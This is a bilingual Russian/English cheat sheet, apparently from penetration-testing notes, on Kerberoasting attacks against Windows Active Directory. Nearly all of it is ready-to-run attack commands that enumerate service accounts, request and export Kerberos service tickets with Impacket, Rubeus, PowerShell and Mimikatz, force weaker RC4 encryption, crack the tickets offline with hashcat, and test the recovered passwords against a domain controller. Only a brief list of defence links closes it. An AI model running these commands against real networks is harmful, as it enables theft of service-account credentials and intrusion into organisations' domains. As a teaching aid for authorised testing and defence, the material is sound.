# Kerberoasting RU
Что такое Kerberoasting? **Kerberoasting** - это атака на систему аутентификации Kerberos, которая используется в сетях Windows для обеспечения безопасности при аутентификации и авторизации пользователей и компьютеров. Атака Kerberoasting основывается на эксплуатации уязвимостей в процессе выдачи сертификатов для служб, работающих под учетными записями с использованием протокола Kerberos.В процессе атаки злоумышленник получает доступ к хэшам паролей сервисных аккаунтов, которые используются для запуска служб в среде Windows.<br>

**Необходимым условием для проведения атак Kerberoasting являются учетные данные пользователя домена (чистый текст или просто NTLM-хэш), оболочка в контексте пользователя домена или учетная запись типа SYSTEM. Как только мы получим этот уровень доступа, мы можем начинать. Мы также должны знать, какой узел в домене является контроллером домена**.<br>

## Explotation Kerberoating with Impacket

Listing SPN Accounts with Impacket
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william
```

Requesting all TGS Tickets
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william -request
```

Requesting a Single TGS ticket
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william -request-user sqldev
```

Saving the TGS Ticket to an Output File
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5  DOMAIN.LOCAL/william -request-user sqldev -outputfile sqldev_tgs
```

Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Explotation Kerberoasting on Windows

Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```

Targeting a Single User
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"
```

Retrieving All Tickets Using setspn.exe
```
setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extracting Tickets from Memory with Mimikatz
```
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
```

Preparing the Base64 Blob for Cracking
```
echo "<base64 blob>" |  tr -d \\n | tee -a encoded_ticket
```

Placing the Output into a File as .kirbi
```
cat encoded_file | base64 -d > sqldev.kirbi
```

Extracting the Kerberos Ticket using kirbi2john
```
kirbi2john sqldev.kirbi | tee -a crack_file
```

Modifiying crack_file for Hashcat
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Cracking with HashCat
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

Using PowerView to Extract TGS Tickets
```
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Using Rubeus
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

**RU:** Проверяя в PowerView, мы видим, что атрибут msDS-SupportedEncryptionTypes установлен в 0. Диаграмма здесь говорит нам, что десятичное значение 0 означает, что определенный тип шифрования не определен и установлен по умолчанию RC4_HMAC_MD5.<br>
**EN:** Checking in PowerView, we see that the msDS-SupportedEncryptionTypes attribute is set to 0. The diagram here tells us that a decimal value of 0 means that the specific encryption type is not defined and is set by default to RC4_HMAC_MD5.

Check msDS-SupportedEncryptionTypes attribute value with PowerView
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Rubeus Kerberoasting RC4_HMAC 
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : RC4_HMAC_DEFAULT

```

Crack RC4
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

Rubeus Kerberoasting AES128_CTS_HMAC_SHA1_96
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

Crack for aes128
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

**RU:** Мы можем использовать Rubeus с флагом /tgtdeleg, чтобы указать, что мы хотим использовать только шифрование RC4 при запросе нового билета. Инструмент делает это, указывая в теле запроса TGS шифрование RC4 как единственный поддерживаемый алгоритм. Это может быть защита от сбоев, встроенная в Active Directory для обратной совместимости. Используя этот флаг, мы можем запросить билет с шифрованием RC4, который может быть взломан гораздо быстрее.<br>
**EN:** We can use Rubeus with the /tgtdeleg flag to specify that we only want to use RC4 encryption when requesting a new ticket. The tool does this by specifying RC4 encryption as the only supported algorithm in the TGS request body. This can be a failover protection built into Active Directory for backward compatibility. Using this flag, we can request a ticket with RC4 encryption, which can be broken much faster.<br>

```
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

## How to Prevent

**RU:**<br>
Для защиты от этой атаки, можно использовать следующие рекомендации:
<li>https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy</li>
<li>https://learn.microsoft.com/ru-ru/windows/win32/ad/service-principal-names</li>
<li>https://attack.mitre.org/techniques/T1558/003/</li>
<li>https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model</li>
</ol>

**EN:**<br>
To protect against this attack, you can use the following recommendations:
<ol>
<li>https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy</li>
<li>https://learn.microsoft.com/ru-ru/windows/win32/ad/service-principal-names</li>
<li>https://attack.mitre.org/techniques/T1558/003/</li>
<li>https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model</li>
</ol>